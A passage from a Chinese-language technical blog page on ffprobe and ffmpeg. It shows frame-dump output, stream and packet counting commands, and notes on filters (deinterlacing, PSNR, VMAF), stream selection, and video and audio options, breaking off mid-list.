class="line">pkt_dts_time=0:00:00.003667</span><br><span class="line">best_effort_timestamp=176</span><br><span class="line">best_effort_timestamp_time=0:00:00.003667</span><br><span class="line">pkt_duration=1024</span><br><span class="line">pkt_duration_time=0:00:00.021333</span><br><span class="line">pkt_pos=1438325</span><br><span class="line">pkt_size=718 byte</span><br><span class="line">sample_fmt=fltp</span><br><span class="line">nb_samples=1024</span><br><span class="line">channels=2</span><br><span class="line">channel_layout=stereo</span><br><span class="line">[/FRAME]</span><br><span class="line">[FRAME]</span><br><span class="line">media_type=audio</span><br><span class="line">stream_index=1</span><br><span class="line">key_frame=1</span><br><span class="line">pkt_pts=1200</span><br><span class="line">pkt_pts_time=0:00:00.025000</span><br><span class="line">pkt_dts=1200</span><br><span class="line">pkt_dts_time=0:00:00.025000</span><br><span class="line">best_effort_timestamp=1200</span><br><span class="line">best_effort_timestamp_time=0:00:00.025000</span><br><span class="line">pkt_duration=1024</span><br><span class="line">pkt_duration_time=0:00:00.021333</span><br><span class="line">pkt_pos=1485652</span><br><span class="line">pkt_size=688 byte</span><br><span class="line">sample_fmt=fltp</span><br><span class="line">nb_samples=1024</span><br><span class="line">channels=2</span><br><span class="line">channel_layout=stereo</span><br><span class="line">[/FRAME]</span><br><span class="line">...</span><br><span class="line">[FRAME]</span><br><span class="line">media_type=audio</span><br><span class="line">stream_index=1</span><br><span class="line">key_frame=1</span><br><span class="line">pkt_pts=2878640</span><br><span class="line">pkt_pts_time=0:00:59.971667</span><br><span class="line">pkt_dts=2878640</span><br><span class="line">pkt_dts_time=0:00:59.971667</span><br><span class="line">best_effort_timestamp=2878640</span><br><span class="line">best_effort_timestamp_time=0:00:59.971667</span><br><span class="line">pkt_duration=1024</span><br><span class="line">pkt_duration_time=0:00:00.021333</span><br><span class="line">pkt_pos=78353915</span><br><span class="line">pkt_size=694 byte</span><br><span class="line">sample_fmt=fltp</span><br><span class="line">nb_samples=1024</span><br><span class="line">channels=2</span><br><span class="line">channel_layout=stereo</span><br><span class="line">[/FRAME]</span><br><span class="line">[FRAME]</span><br><span class="line">media_type=audio</span><br><span class="line">stream_index=1</span><br><span class="line">key_frame=1</span><br><span class="line">pkt_pts=2879664</span><br><span class="line">pkt_pts_time=0:00:59.993000</span><br><span class="line">pkt_dts=2879664</span><br><span class="line">pkt_dts_time=0:00:59.993000</span><br><span class="line">best_effort_timestamp=2879664</span><br><span class="line">best_effort_timestamp_time=0:00:59.993000</span><br><span class="line">pkt_duration=1008</span><br><span class="line">pkt_duration_time=0:00:00.021000</span><br><span class="line">pkt_pos=78363201</span><br><span class="line">pkt_size=646 byte</span><br><span class="line">sample_fmt=fltp</span><br><span class="line">nb_samples=1024</span><br><span class="line">channels=2</span><br><span class="line">channel_layout=stereo</span><br><span class="line">[/FRAME]</span><br></pre></td></tr></table></figure>
    </td>
  </tr>
</table></div></div></div>


<div class="tabs" id="ffprobe-usage"><ul class="nav-tabs"><li class="tab active"><a href="#ffprobe-usage-1">查看封装和流信息</a></li><li class="tab"><a href="#ffprobe-usage-2">统计包数量</a></li><li class="tab"><a href="#ffprobe-usage-3">统计帧数量</a></li></ul><div class="tab-content"><div class="tab-pane active" id="ffprobe-usage-1"><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">$ ffprobe -v quiet \</span><br><span class="line">  -show_streams \</span><br><span class="line">  -show_entries format=filename<span class="punctuation">,</span>start_time<span class="punctuation">:</span>stream=duration<span class="punctuation">,</span>width<span class="punctuation">,</span>height<span class="punctuation">,</span>r_frame_rate<span class="punctuation">,</span>bit_rate \</span><br><span class="line">  -of json \</span><br><span class="line">  -i <span class="number">1.</span>mp4</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;programs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;streams&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;width&quot;</span><span class="punctuation">:</span> <span class="number">1920</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;height&quot;</span><span class="punctuation">:</span> <span class="number">1080</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;r_frame_rate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;60/1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0:01:00.016000&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;bit_rate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.020903 Mbit/s&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;disposition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;default&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;dub&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;original&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;lyrics&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;karaoke&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;forced&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;hearing_impaired&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;visual_impaired&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;clean_effects&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;attached_pic&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;timed_thumbnails&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;language&quot;</span><span class="punctuation">:</span> <span class="string">&quot;und&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;handler_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VideoHandler&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;r_frame_rate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0/0&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0:01:00.014000&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;bit_rate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;256.225000 Kbit/s&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;disposition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;default&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;dub&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;original&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;comment&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;lyrics&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;karaoke&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;forced&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;hearing_impaired&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;visual_impaired&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;clean_effects&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;attached_pic&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;timed_thumbnails&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;tags&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;language&quot;</span><span class="punctuation">:</span> <span class="string">&quot;und&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;handler_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SoundHandler&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;filename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.mp4&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;start_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0:00:00.000000&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="ffprobe-usage-2"><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">$ ffprobe -v error \</span><br><span class="line">  -count_packets \</span><br><span class="line">  -show_entries stream=codec_type<span class="punctuation">,</span>nb_read_packets \</span><br><span class="line">  -of json \</span><br><span class="line">  <span class="number">1.</span>mp4</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;programs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;streams&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;codec_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;video&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;nb_read_packets&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3660&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;codec_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;audio&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;nb_read_packets&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2861&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="ffprobe-usage-3"><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">$ ffprobe -v error \</span><br><span class="line">  -count_frames \</span><br><span class="line">  -show_entries stream=codec_type<span class="punctuation">,</span>nb_read_frames \</span><br><span class="line">  -of json \</span><br><span class="line">  <span class="number">1.</span>mp4</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;streams&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;codec_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;video&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;nb_read_frames&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3600&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;codec_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;audio&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;nb_read_frames&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2814&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h1><p><a href="http://ffmpeg.org/ffmpeg-all.html">ffmpeg Documentation</a></p>
<pre class="mermaid">
graph LR
InputFile --&gt; |demuxer|EncodedPackets --&gt; |decoder|DecodedFrames
DecodedFrames --&gt; |filter|FilteredFrames --&gt; |encoder|EncodedPackets --&gt; |muxer|OutputFile
</pre>

<p>概要：<code>ffmpeg [global_options] &#123;[input_options] -i input_url&#125; ... &#123;[output_options] output_url&#125; ...</code></p>
<ul>
<li><code>-y</code> 覆盖输出文件</li>
<li><code>-nostdin</code> 禁用标准输入（等同<code>ffmpeg ... &lt; /dev/null</code>）</li>
<li><code>-f avi</code> 强制文件封装格式<ul>
<li>不指定此参数时，会自动探测输入文件格式，以及根据扩展名猜测输出文件格式</li>
</ul>
</li>
<li><code>-i xxx.mp4</code> 输入文件</li>
<li><code>-re</code> 以真实速率读取帧，同<code>-readrate 1</code></li>
<li><code>-stream_loop 3</code> 输入流循环3次。（0-不循环，-1无限循环）</li>
<li><code>-ss 100</code> 跳转（seek）到相对起始100s的位置</li>
<li><code>-sseof 100</code> 跳转（seek）到相对结束100s的位置</li>
<li><code>-t 60s</code>&#x2F;<code>-t 01:00</code> 限制时长60s</li>
</ul>
<h2 id="Filtering"><a href="#Filtering" class="headerlink" title="Filtering"></a>Filtering</h2><p><a href="https://ffmpeg.org/ffmpeg-filters.html">FFmpeg Filters Documentation</a><br><a href="https://trac.ffmpeg.org/wiki/FilteringGuide">FFmpeg Filtering Guide</a></p>
<h3 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h3><p>一路输入一路输出。</p>
<ul>
<li>af 音频过滤</li>
<li>vf 视频过滤<ul>
<li><code>-vf scale=-1:720</code> : 分辨率转换到720p</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">缩放视频到720p</span></span><br><span class="line">ffmpeg -i i.mp4 -vf scale=-1:720 o_480.mp4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">视频上叠加yuv直方图</span></span><br><span class="line">ffmpeg -i i.mp4 -vf &quot;split=2[a][b],[b]histogram,format=yuv420p[hh],[a][hh]overlay&quot; yuv_histogram.mp4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">视频上叠加运动矢量（motion vector）</span></span><br><span class="line">ffmpeg -flags2 +export_mvs -i i.mp4 -vf codecview=mv=pf+bf+bb ovis_mv.mp4</span><br></pre></td></tr></table></figure>

<h4 id="idet"><a href="#idet" class="headerlink" title="idet"></a>idet</h4><p><a href="https://ffmpeg.org/ffmpeg-filters.html#idet">ffmpeg &#x2F; Video Filters &#x2F; idet</a></p>
<ul>
<li>探测输入帧是interlaced, progressive, top or bottom field first。</li>
<li>探测邻近的帧（frame）之间重复的场（field）数量</li>
<li>单帧探测时，当前帧的交错类型只考虑相邻帧的影响</li>
<li>多帧探测时，当前帧的交错类型考虑之前所有帧的影响</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用idet过滤器，采样360帧，忽略音频帧</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">TFF - Top Field First</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">BFF - Bottom Field First</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffmpeg -filter:v idet -frames:v 360 -an -f rawvideo -y /dev/null -i 20090228_085119-H.264.m2ts.mp4</span></span><br><span class="line">[Parsed_idet_0 @ 0x55792d6e7c80] Repeated Fields: Neither:   182 Top:     0 Bottom:     0</span><br><span class="line">[Parsed_idet_0 @ 0x55792d6e7c80] Single frame detection: TFF:   135 BFF:     0 Progressive:     2 Undetermined:    45</span><br><span class="line">[Parsed_idet_0 @ 0x55792d6e7c80] Multi frame detection: TFF:   182 BFF:     0 Progressive:     0 Undetermined:     0</span><br></pre></td></tr></table></figure>

<h4 id="tinterlace"><a href="#tinterlace" class="headerlink" title="tinterlace"></a>tinterlace</h4><p><a href="https://ffmpeg.org/ffmpeg-filters.html#tinterlace">ffmpeg &#x2F; Video Filters &#x2F; tinterlace</a></p>
<ul>
<li>从第1帧开始，对每一帧执行<a href="/Media/VideoBasic#%E4%BA%A4%E9%94%99"><strong>交错（interlacing）</strong></a>变换<ul>
<li><code>interleave_bottom, 5</code> 执行底场优先，高度不变，帧率减半的交错</li>
</ul>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffmpeg -i HitchhikersGuide.mp4 -vf <span class="string">&quot;tinterlace=5&quot;</span> HitchhikersGuide-t.mp4</span></span><br><span class="line">[libx264 @ 0x5561fdb59f40] using SAR=1/1</span><br><span class="line">[libx264 @ 0x5561fdb59f40] using cpu capabilities: MMX2 SSE2Fast SSSE3 SSE4.2 AVX FMA3 BMI2 AVX2</span><br><span class="line">[libx264 @ 0x5561fdb59f40] profile High, level 2.2</span><br><span class="line">[libx264 @ 0x5561fdb59f40] 264 - core 155 r2917 0a84d98 - H.264/MPEG-4 AVC codec - Copyleft 2003-2018 - http://www.videolan.org/x264.html - options: cabac=1 ref=3 deblock=1:0:0 analyse=0x3:0x113 me=hex subme=7 psy=1 psy_rd=1.00:0.00 mixed_ref=1 me_range=16 chroma_me=1 trellis=1 8x8dct=1 cqm=0 deadzone=21,11 fast_pskip=1 chroma_qp_offset=-2 threads=6 lookahead_threads=1 sliced_threads=0 nr=0 decimate=1 interlaced=0 bluray_compat=0 constrained_intra=0 bframes=3 b_pyramid=2 b_adapt=1 b_bias=0 direct=1 weightb=1 open_gop=0 weightp=2 keyint=250 keyint_min=15 scenecut=40 intra_refresh=0 rc_lookahead=40 rc=crf mbtree=1 crf=23.0 qcomp=0.60 qpmin=0 qpmax=69 qpstep=4 ip_ratio=1.40 aq=1:1.00</span><br><span class="line">[libx264 @ 0x5561fdb59f40] frame I:12    Avg QP:15.17  size: 20887</span><br><span class="line">[libx264 @ 0x5561fdb59f40] frame P:661   Avg QP:19.46  size:  7614</span><br><span class="line">[libx264 @ 0x5561fdb59f40] frame B:1370  Avg QP:23.45  size:  2334</span><br><span class="line">[libx264 @ 0x5561fdb59f40] consecutive B-frames:  6.6%  8.4% 10.6% 74.4%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] mb I  I16..4: 43.0% 35.0% 21.9%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] mb P  I16..4:  7.9% 10.7%  3.1%  P16..4: 28.5% 13.1%  7.1%  0.0%  0.0%    skip:29.7%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] mb B  I16..4:  1.1%  1.4%  0.5%  B16..8: 29.7%  4.9%  1.3%  direct: 3.4%  skip:57.7%  L0:47.7% L1:43.9% BI: 8.4%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] 8x8 transform intra:48.0% inter:59.7%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] coded y,uvDC,uvAC intra: 38.1% 57.9% 21.6% inter: 12.6% 17.0% 1.8%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] i16 v,h,dc,p: 35% 40% 13% 12%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] i8 v,h,dc,ddl,ddr,vr,hd,vl,hu: 26% 22% 35%  3%  2%  3%  3%  3%  3%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] i4 v,h,dc,ddl,ddr,vr,hd,vl,hu: 19% 47% 14%  3%  4%  4%  4%  3%  4%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] i8c dc,h,v,p: 47% 29% 20%  4%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] Weighted P-Frames: Y:7.6% UV:5.0%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] ref P L0: 60.0% 11.9% 21.4%  6.3%  0.3%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] ref B L0: 79.8% 14.7%  5.5%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] ref B L1: 93.6%  6.4%</span><br><span class="line">[libx264 @ 0x5561fdb59f40] kb/s:498.12</span><br><span class="line">[aac @ 0x5561fdb89740] Qavg: 235.916</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffprobe HitchhikersGuide-t.mp4</span></span><br><span class="line">Input #0, mov,mp4,m4a,3gp,3g2,mj2, from &#x27;HitchhikersGuide-t.mp4&#x27;:</span><br><span class="line">  Metadata:</span><br><span class="line">    major_brand     : isom</span><br><span class="line">    minor_version   : 512</span><br><span class="line">    compatible_brands: isomiso2avc1mp41</span><br><span class="line">    encoder         : Lavf58.29.100</span><br><span class="line">  Duration: 00:02:16.23, start: 0.000000, bitrate: 631 kb/s</span><br><span class="line">    Stream #0:0(und): Video: h264 (High) (avc1 / 0x31637661), yuv420p, 640x480 [SAR 1:1 DAR 4:3], 498 kb/s, 15 fps, 15 tbr, 15360 tbn, 30 tbc (default)</span><br><span class="line">    Metadata:</span><br><span class="line">      handler_name    : ISO Media file produced by Google Inc.</span><br><span class="line">    Stream #0:1(und): Audio: aac (LC) (mp4a / 0x6134706D), 44100 Hz, stereo, fltp, 128 kb/s (default)</span><br><span class="line">    Metadata:</span><br><span class="line">      handler_name    : ISO Media file produced by Google Inc.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffprobe HitchhikersGuide.mp4</span></span><br><span class="line">Input #0, mov,mp4,m4a,3gp,3g2,mj2, from &#x27;HitchhikersGuide.mp4&#x27;:</span><br><span class="line">  Metadata:</span><br><span class="line">    major_brand     : isom</span><br><span class="line">    minor_version   : 512</span><br><span class="line">    compatible_brands: isomiso2avc1mp41</span><br><span class="line">    encoder         : Lavf58.45.100</span><br><span class="line">  Duration: 00:02:16.23, start: 0.000000, bitrate: 514 kb/s</span><br><span class="line">    Stream #0:0(und): Video: h264 (Main) (avc1 / 0x31637661), yuv420p(tv, bt709), 640x480 [SAR 1:1 DAR 4:3], 378 kb/s, 30 fps, 30 tbr, 15360 tbn, 60 tbc (default)</span><br><span class="line">    Metadata:</span><br><span class="line">      handler_name    : ISO Media file produced by Google Inc.</span><br><span class="line">    Stream #0:1(und): Audio: aac (LC) (mp4a / 0x6134706D), 44100 Hz, stereo, fltp, 128 kb/s (default)</span><br><span class="line">    Metadata:</span><br><span class="line">      handler_name    : ISO Media file produced by Google Inc.</span><br></pre></td></tr></table></figure>

<h4 id="yadif"><a href="#yadif" class="headerlink" title="yadif"></a>yadif</h4><p>对输入的视频执行反交错（deinterlace）</p>
<ul>
<li><code>1, send_field</code> 每一个场（field）作为一帧（frame）输出</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i HitchhikersGuide-t.mp4 -filter:v yadif=1 HitchhikersGuide-p2.mp4</span><br></pre></td></tr></table></figure>

<h3 id="complex"><a href="#complex" class="headerlink" title="complex"></a>complex</h3><p>多路输入多路输出，用<code>-filter_complex</code>或<code>-lavfi</code>选项配置。</p>
<ul>
<li><code>overlay</code> 两路视频输入一路输出（视频叠加在一起）</li>
<li><code>amix</code> 混音</li>
</ul>
<h4 id="psnr"><a href="#psnr" class="headerlink" title="psnr"></a>psnr</h4><p><a href="https://ffmpeg.org/ffmpeg-filters.html#psnr">ffmpeg &#x2F; Video Filters &#x2F; psnr</a></p>
<p>计算两个输入视频的平均、最小、最大峰值信噪比，输入的视频分辨率和像素格式必须相同。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffmpeg -i HitchhikersGuide-target.mp4 -i HitchhikersGuide-origin.mp4 -lavfi psnr=stats_file=psnr_logfile.txt -f null -</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffmpeg -i HitchhikersGuide-target.mp4 -i HitchhikersGuide-origin.mp4 -filter_complex <span class="string">&quot;psnr=stats_file=psnr_logfile.txt&quot;</span> -f null -</span></span><br><span class="line">[Parsed_psnr_0 @ 0x5623ab67af40] PSNR y:28.700056 u:39.638801 v:41.528778 average:30.319234 min:13.854924 max:55.468623</span><br></pre></td></tr></table></figure>

<h4 id="vmaf"><a href="#vmaf" class="headerlink" title="vmaf"></a>vmaf</h4><p><a href="https://github.com/Netflix/vmaf">Netflix&#x2F;vmaf</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i HitchhikersGuide-p.mp4 -i HitchhikersGuide.mp4 -lavfi libvmaf=&quot;model_path=vmaf_v0.6.1.pkl&quot;:log_path=vmaf_logfile.txt -f null -</span><br></pre></td></tr></table></figure>

<h2 id="Stream"><a href="#Stream" class="headerlink" title="Stream"></a>Stream</h2><h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><p>忽略decoding和encoding，只处理demuxing和muxing过程，用<code>-codec</code>选项配置。</p>
<ul>
<li><code>-c copy</code> 拷贝输入文件中的帧到输出文件</li>
<li><code>-c:a copy</code> 只拷贝输入文件中的音频帧到输出文件</li>
</ul>
<h3 id="selection"><a href="#selection" class="headerlink" title="selection"></a>selection</h3><p>控制输出文件中的流选择过程。</p>
<ul>
<li>自动模式：<ul>
<li>视频选择最高分辨率的</li>
<li>音频选择最多通道数的</li>
<li>发现的第一个字幕</li>
</ul>
</li>
<li>手动模式：<ul>
<li><code>-map 2:3</code> 选择第3个输入文件中的第4个流</li>
<li><code>-map 1:a</code> 选择第2个输入文件中的所有音频流</li>
<li><code>-vn/-an/-sn/-dn</code> 忽略输入文件中的视频&#x2F;音频&#x2F;字幕&#x2F;数据流</li>
</ul>
</li>
</ul>
<h3 id="specifier"><a href="#specifier" class="headerlink" title="specifier"></a>specifier</h3><p>应用于stream、codec、bitrate的描述选项。</p>
<ul>
<li><code>-codec:a:1 ac3</code> 指定第2个音频流用ac3编解码器处理（:a:1 第2个音频流）</li>
<li><code>-b:a 128k</code> 所有音频流用128k码率（:a 所有音频流）</li>
<li><code>-b:v 512k</code> 所有视频流用512k码率（:v 所有视频流）</li>
<li><code>-ac:a:1 2</code> 第2个音频流的通道数为2</li>
<li><code>-codec copy</code>&#x2F;<code>-codec: copy</code> 拷贝所有的流（空描述项指所有流）</li>
<li><code>-threads:1 4</code> 设置第2个流的线程数量为4</li>
</ul>
<h2 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h2><ul>
<li><code>-frames:v 360</code> 限制视频帧数量为360</li>
<li><code>-fps_mode -1</code> 设置帧率模式（视频同步方法），同<code>vsync -1</code><ul>
<li>passthrough(0) 透传每一帧的时间戳</li>
<li>cfr(1) 帧会被复制或丢弃以达到固定的帧率</li>
<li>vfr(2) 透传每一帧的时间戳，但会丢弃重复时间戳的帧</li>
<li>drop 丢弃所有时间戳，然后基于帧率重新生成时间戳</li>
<li>auto(-1) 按封装器（muxer）的能力自动选择cfr还是vfr</li>
</ul>
</li>
<li><code>-pix_fmt yuv420p</code> 设置像素格式</li>
<li><code>-r 24</code> 设置帧率:24</li>
</ul>
<h2 id="rawvideo"><a href="#rawvideo" class="headerlink" title="rawvideo"></a>rawvideo</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg \</span><br><span class="line">-f rawvideo -pixel_format uyvy422 -video_size 1920x1080 -i test.uyvy422 \</span><br><span class="line">-f rawvideo -pix_fmt yuv420p -s 1920x1080 uyvy_to_yuv.420p</span><br></pre></td></tr></table></figure>

<h2 id="Audio"><a href="#Audio" class="headerlink" title="Audio"></a>Audio</h2><ul>
<li><code>-acodec aac</code> 设置音频流的编码格式，<code>-codec:a</code>的别名</li>
<li><code>-ac 2</code> 设置音频通道数量</li>
<li><code>-af loudnorm</code> 应用音频过滤器loudnorm，<code>-filter:a loudnorm</code>的别名</li>
<li><code>-an</code> 阻止所有音频流到输出文件</li>
<li><code>-ar 14400</code> 设置音频采样率</li>
<li><code>-aq xxx</code> 设置音频质量，<code>-q:a xxx</code>的别名</li>
